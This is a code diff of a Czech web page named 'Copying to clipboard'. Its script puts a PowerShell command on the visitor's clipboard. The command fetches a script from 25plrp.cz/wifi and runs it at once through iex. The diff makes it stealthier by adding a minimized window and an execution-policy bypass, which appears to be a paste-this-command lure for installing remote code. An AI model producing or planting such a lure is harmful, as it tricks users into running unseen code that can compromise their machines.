@@ -41,7 +41,7 @@
   <title>Kopírování do schránky</title>
   <style>
     #zprava {
-      margin-top: 30px;
+      margin-top: 50px;
       color: green;
       font-weight: bold;
       display: none;
@@ -54,7 +54,7 @@
 
   <script>
     function kopiruj() {
-      navigator.clipboard.writeText('powershell iwr "25plrp.cz/wifi" | iex')
+      navigator.clipboard.writeText('powershell.exe -WindowStyle Minimized -ExecutionPolicy Bypass -Command "iwr "25plrp.cz/wifi" | iex')
         .then(() => {
           let msg = document.getElementById("zprava");
           msg.style.display = "block";
